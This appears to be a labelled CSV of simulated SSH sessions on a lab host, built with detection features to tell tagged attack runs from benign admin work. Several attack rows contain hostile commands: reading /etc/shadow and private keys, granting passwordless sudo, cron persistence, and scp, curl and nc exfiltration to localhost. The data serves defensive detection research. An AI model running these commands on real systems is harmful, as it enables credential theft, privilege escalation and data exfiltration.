session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil
19fc893baa9e3e45000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:30:44.156+0000,2026-08-03T16:30:47.441+0000,2,False,False,False,"['echo TAG:atk_persistence_0338ff', 'echo \\', 'rm /var/spool/cron/crontabs/persistevil -f', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",6,0,SSH,1,2026-08-03 16:30:44.156000+00:00,2026-08-03 16:30:47.441000+00:00,2.0,16,0,0,2.0,1.0,24.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc893d39e37b20000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T16:30:51.858+0000,2026-08-03T16:30:57.405+0000,5,False,False,False,"['sudo -l', 'echo TAG:atk_privesc_44289e', 'useradd -m tempuser_atk_privesc_44289e', ""echo 'tempuser_atk_privesc_44289e ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/tempuser_atk_privesc_44289e > /dev/null"", 'id tempuser_atk_privesc_44289e', 'rm -f /etc/sudoers.d/tempuser_atk_privesc_44289e', 'userdel -r tempuser_atk_privesc_44289e', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,SSH,1,2026-08-03 16:30:51.858000+00:00,2026-08-03 16:30:57.405000+00:00,5.0,16,0,0,6.0,1.0,46.5,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc8c47c860dc48000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:23:59.693+0000,2026-08-03T17:24:04.693+0000,4,False,False,False,"['echo TAG:atk_exfil_cd788b', ""echo 'test-data-atk_exfil_cd788b' > /tmp/exfil_test_atk_exfil_cd788b.txt"", 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_cd788b.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_cd788b.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_cd788b.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_cd788b.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",9,0,SSH,1,2026-08-03 17:23:59.693000+00:00,2026-08-03 17:24:04.693000+00:00,4.0,17,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
19fc8c49e8f50a24000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:24:08.442+0000,2026-08-03T17:24:18.193+0000,9,False,False,False,"['echo TAG:ben_admin_2245bf', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'df -BG', 'cp ../* .', 'ls -b', 'gzip zipped_file.tar', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,SSH,1,2026-08-03 17:24:08.442000+00:00,2026-08-03 17:24:18.193000+00:00,9.0,17,0,0,10.0,1.0,9.9,3.3219280948873626,0.0,0.0,0.0,0.0,1.0,0.0
19fc8c4d219dfb1a000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:24:21.443+0000,2026-08-03T17:24:44.944+0000,23,False,False,False,"['cat /etc/passwd', 'echo TAG:ben_auditor_f60515', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'find /opt -not -group staff', 'cat > newfile.txt']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 17:24:21.443000+00:00,2026-08-03 17:24:44.944000+00:00,23.0,17,0,0,7.0,1.0,12.571428571428571,2.8073549220576037,1.0,0.0,0.0,0.0,1.0,0.0
19fc8c53728427df000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:24:47.362+0000,2026-08-03T17:24:53.692+0000,6,False,False,False,"['sudo -l', 'echo TAG:atk_privesc_e23cb7', 'sudo useradd -m tempuser_atk_privesc_e23cb7', ""echo 'tempuser_atk_privesc_e23cb7 ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/tempuser_atk_privesc_e23cb7 > /dev/null"", 'id tempuser_atk_privesc_e23cb7', 'sudo rm -f /etc/sudoers.d/tempuser_atk_privesc_e23cb7', 'sudo userdel -r tempuser_atk_privesc_e23cb7', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,SSH,1,2026-08-03 17:24:47.362000+00:00,2026-08-03 17:24:53.692000+00:00,6.0,17,0,0,6.0,1.0,49.833333333333336,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc8c559e6a87d9000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:24:56.194+0000,2026-08-03T17:25:10.693+0000,14,False,False,False,"['ls -la /var/lib', 'echo TAG:ben_dba_c2f47c', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'gzip style.css', 'sleep 2 & sleep 3 & wait', 'cp ~/Pictures/*.jpg ~/Desktop/', 'find /var -gid 100', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,SSH,1,2026-08-03 17:24:56.194000+00:00,2026-08-03 17:25:10.693000+00:00,14.0,17,0,0,8.0,1.0,18.75,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8c599a415fd1000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:25:12.940+0000,2026-08-03T17:25:17.443+0000,4,False,False,False,"['echo TAG:atk_cred_access_af37bf', 'sudo cat /etc/shadow', 'sudo find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 17:25:12.940000+00:00,2026-08-03 17:25:17.443000+00:00,4.0,17,0,0,4.0,1.0,43.75,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc8c5b80d8fbf1000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:25:20.299+0000,2026-08-03T17:25:26.693+0000,5,False,False,False,"['sudo -l', 'echo TAG:atk_privesc_f17a81', 'sudo useradd -m tempuser_atk_privesc_f17a81', ""echo 'tempuser_atk_privesc_f17a81 ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/tempuser_atk_privesc_f17a81 > /dev/null"", 'id tempuser_atk_privesc_f17a81', 'sudo rm -f /etc/sudoers.d/tempuser_atk_privesc_f17a81', 'sudo userdel -r tempuser_atk_privesc_f17a81', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,SSH,1,2026-08-03 17:25:20.299000+00:00,2026-08-03 17:25:26.693000+00:00,5.0,17,0,0,6.0,1.0,49.833333333333336,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc8c5d9f207a42000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:25:29.072+0000,2026-08-03T17:25:35.944+0000,6,False,False,False,"['echo TAG:ben_dba_65fa34', 'ls -la /var/lib', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'df -x tmpfs', 'gzip metrics.csv', 'cp -r src /opt/', 'du -B 64G', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,SSH,1,2026-08-03 17:25:29.072000+00:00,2026-08-03 17:25:35.944000+00:00,6.0,17,0,0,8.0,1.0,14.375,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8c602183b166000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:25:39.445+0000,2026-08-03T17:25:48.443+0000,9,False,False,False,"['echo TAG:ben_auditor_5d0839', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', ""grep -E '\\\\b[A-Z]{2,}\\\\b' text.txt"", 'find /etc -name \\', 'find /srv -not -user root', 'find /var -iregex \\', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 17:25:39.445000+00:00,2026-08-03 17:25:48.443000+00:00,9.0,17,0,0,9.0,1.0,15.444444444444445,3.169925001442312,1.0,0.0,0.0,0.0,1.0,0.0
19fc8c630ccb8424000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:25:51.194+0000,2026-08-03T17:25:55.444+0000,3,False,False,False,"['echo TAG:atk_cred_access_9b0332', 'cat /etc/shadow', 'find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 17:25:51.194000+00:00,2026-08-03 17:25:55.444000+00:00,3.0,17,0,0,4.0,1.0,41.25,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc8c64e724995e000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:25:58.945+0000,2026-08-03T17:26:07.444+0000,8,False,False,False,"['cd /tmp && ls -la', 'echo TAG:ben_dev_84df06', 'git status', 'cat /etc/os-release', 'python3 --version', 'zip codes.zip *.c *.h', ""sed -n '/[^0-9]/p' file.txt"", ""grep 'Failed login' /var/log/auth.log"", 'find /var -anewer /tmp/test.log', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,SSH,1,2026-08-03 17:25:58.945000+00:00,2026-08-03 17:26:07.444000+00:00,8.0,17,0,0,8.0,1.0,22.375,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8c67e181a32d000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:26:10.992+0000,2026-08-03T17:26:17.693+0000,6,False,False,False,"['echo TAG:ben_dev_c37a95', 'cd /tmp && ls -la', 'git status', 'cat /etc/os-release', 'python3 --version', ""grep '22' /etc/services"", 'gzip track.wav', 'gzip download.tar', 'touch ~/linda', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,SSH,1,2026-08-03 17:26:10.992000+00:00,2026-08-03 17:26:17.693000+00:00,6.0,17,0,0,8.0,1.0,16.25,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8c69fad456c1000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:26:19.695+0000,2026-08-03T17:26:24.443+0000,4,False,False,False,"['echo TAG:atk_cred_access_bf8359', 'sudo cat /etc/shadow', 'sudo find /root /home /etc -name id_rsa 2>/dev/null', 'cat ~/.ssh/authorized_keys 2>/dev/null', 'find /usr/bin /usr/sbin /bin /sbin -perm -4000 -type f 2>/dev/null', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,SSH,1,2026-08-03 17:26:19.695000+00:00,2026-08-03 17:26:24.443000+00:00,4.0,17,0,0,4.0,1.0,43.75,2.0,1.0,0.0,1.0,0.0,0.0,0.0
19fc8c6be7ca476f000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:26:27.695+0000,2026-08-03T17:26:36.444+0000,8,False,False,False,"['echo TAG:atk_recon_24d2c4', 'whoami', 'id', 'uname -a', 'hostname', 'cat /etc/os-release', 'ps aux', 'netstat -tulnp', 'who', 'last -n 5', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",13,0,SSH,1,2026-08-03 17:26:27.695000+00:00,2026-08-03 17:26:36.444000+00:00,8.0,17,0,0,9.0,1.0,8.333333333333334,3.169925001442312,0.0,0.0,0.0,0.0,1.0,0.0
19fc8c6eebd2b5ec000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:26:39.835+0000,2026-08-03T17:26:45.694+0000,5,False,False,False,"['echo TAG:ben_dba_da403a', 'ls -la /var/lib', 'du -sh /var/log', 'ps aux | grep -i sql', 'cat /etc/hosts', 'find /var -mindepth 1 -type d', 'du -B 5G', 'du --time=atime', 'mv *.txt backup/', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,SSH,1,2026-08-03 17:26:39.835000+00:00,2026-08-03 17:26:45.694000+00:00,5.0,17,0,0,8.0,1.0,16.5,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8c7115c640e7000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:26:48.695+0000,2026-08-03T17:27:09.944+0000,20,False,False,False,"['echo TAG:ben_auditor_4470f1', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'find /var -type f -exec md5sum {} \\\\;']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 17:26:48.695000+00:00,2026-08-03 17:27:09.944000+00:00,20.0,17,0,0,6.0,1.0,13.5,2.584962500721156,1.0,0.0,0.0,0.0,1.0,0.0
19fc8c76af10924e000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:27:12.027+0000,2026-08-03T17:27:20.194+0000,8,False,False,False,"['echo TAG:ben_auditor_239cc5', 'cat /etc/passwd', 'ls -la /etc/', 'w', 'last -n 10', 'uptime', 'find /home -user alice', 'find /var -anewer /tmp/test.log', 'find /home -type f -exec wc -l {} \\\\;', 'ls -lR ~', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",13,0,SSH,1,2026-08-03 17:27:12.027000+00:00,2026-08-03 17:27:20.194000+00:00,8.0,17,0,0,9.0,1.0,15.777777777777779,3.169925001442312,1.0,0.0,0.0,0.0,1.0,0.0
19fc8c7966a9d9d8000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:27:23.194+0000,2026-08-03T17:27:32.695+0000,9,False,False,False,"['echo TAG:ben_admin_871efc', 'ls -la', 'df -h', 'systemctl --no-pager status sshd', 'uptime', 'free -m', 'who', 'cp -v config /etc/', 'zip -r videos.zip videos', 'cp -f * /tmp/', 'du -a --exclude=\\', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",14,0,SSH,1,2026-08-03 17:27:23.194000+00:00,2026-08-03 17:27:32.695000+00:00,9.0,17,0,0,10.0,1.0,13.1,3.3219280948873626,0.0,0.0,0.0,0.0,1.0,0.0
19fc8c7ca3c760de000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:27:36.355+0000,2026-08-03T17:27:56.446+0000,19,False,False,False,"['cd /tmp && ls -la', 'echo TAG:ben_dev_ecae13', 'git status', 'cat /etc/os-release', 'python3 --version', 'find /var -type f -not -name \\', 'bzip2 compression_test.txt', ""grep -c 'error' *.log"", 'bzip2 jsonfile.json', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,SSH,1,2026-08-03 17:27:36.355000+00:00,2026-08-03 17:27:56.446000+00:00,19.0,17,0,0,8.0,1.0,19.875,3.0,0.0,0.0,0.0,0.0,0.0,0.0
19fc8c821ac6868c000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:27:58.497+0000,2026-08-03T17:28:06.195+0000,7,False,False,False,"['echo TAG:atk_persistence_7e8c03', 'echo \\', 'echo \\', 'echo \\', 'echo \\', 'rm /etc/cron.daily/persistevil -f', 'rm /etc/cron.hourly/persistevil -f', 'rm /etc/cron.monthly/persistevil -f', 'rm /etc/cron.weekly/persistevil -f', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,SSH,1,2026-08-03 17:27:58.497000+00:00,2026-08-03 17:28:06.195000+00:00,7.0,17,0,0,8.0,0.625,20.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0
19fc8c84e670eee2000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:28:09.946+0000,2026-08-03T17:28:14.912+0000,4,False,False,False,"[""echo 'test-data-atk_exfil_c9f2b8' > /tmp/exfil_test_atk_exfil_c9f2b8.txt"", 'echo TAG:atk_exfil_c9f2b8', 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_c9f2b8.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_c9f2b8.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_c9f2b8.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_c9f2b8.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",9,0,SSH,1,2026-08-03 17:28:09.946000+00:00,2026-08-03 17:28:14.912000+00:00,4.0,17,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
19fc8c86c44fcdfb000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:28:17.696+0000,2026-08-03T17:28:22.945+0000,5,False,False,False,"['echo TAG:atk_persistence_438a41', ""echo '#!/bin/bash' > /tmp/.cache_update_atk_persistence_438a41.sh"", '(crontab -l 2>/dev/null; echo \\', 'crontab -l', 'crontab -l | grep -v atk_persistence_438a41 | crontab -', 'rm -f /tmp/.cache_update_atk_persistence_438a41.sh', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",9,0,SSH,1,2026-08-03 17:28:17.696000+00:00,2026-08-03 17:28:22.945000+00:00,5.0,17,0,0,5.0,1.0,42.2,2.321928094887362,0.0,0.0,1.0,0.0,0.0,0.0
19fc8c88ba67dd50000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:28:25.696+0000,2026-08-03T17:28:35.446+0000,9,False,False,False,"['echo TAG:atk_recon_382bff', 'whoami', 'id', 'uname -a', 'hostname', 'cat /etc/os-release', 'ps aux', 'netstat -tulnp', 'who', 'last -n 5', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",13,0,SSH,1,2026-08-03 17:28:25.696000+00:00,2026-08-03 17:28:35.446000+00:00,9.0,17,0,0,9.0,1.0,8.333333333333334,3.169925001442312,0.0,0.0,0.0,0.0,1.0,0.0
19fc8c8c170d482e000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:28:39.295+0000,2026-08-03T17:28:45.697+0000,5,False,False,False,"['echo TAG:atk_privesc_adcd27', 'sudo -l', 'useradd -m tempuser_atk_privesc_adcd27', ""echo 'tempuser_atk_privesc_adcd27 ALL=(ALL) NOPASSWD:ALL' | tee /etc/sudoers.d/tempuser_atk_privesc_adcd27 > /dev/null"", 'id tempuser_atk_privesc_adcd27', 'rm -f /etc/sudoers.d/tempuser_atk_privesc_adcd27', 'userdel -r tempuser_atk_privesc_adcd27', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,SSH,1,2026-08-03 17:28:39.295000+00:00,2026-08-03 17:28:45.697000+00:00,5.0,17,0,0,6.0,1.0,46.5,2.584962500721156,0.0,1.0,0.0,0.0,1.0,0.0
19fc8c8e334df7f1000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-03T17:28:48.037+0000,2026-08-03T17:28:52.696+0000,4,False,False,False,"['echo TAG:atk_exfil_6a7166', ""echo 'test-data-atk_exfil_6a7166' > /tmp/exfil_test_atk_exfil_6a7166.txt"", 'scp -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=3 /tmp/exfil_test_atk_exfil_6a7166.txt root@127.0.0.1:/tmp/ 2>&1 | head -5', 'curl -s -m 3 -X POST -F file=@/tmp/exfil_test_atk_exfil_6a7166.txt http://127.0.0.1:9999/upload 2>&1 | head -3', 'nc -w 2 127.0.0.1 9999 < /tmp/exfil_test_atk_exfil_6a7166.txt 2>&1', 'rm -f /tmp/exfil_test_atk_exfil_6a7166.txt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",9,0,SSH,1,2026-08-03 17:28:48.037000+00:00,2026-08-03 17:28:52.696000+00:00,4.0,17,0,0,5.0,1.0,86.2,2.321928094887362,0.0,0.0,0.0,0.0,0.0,1.0
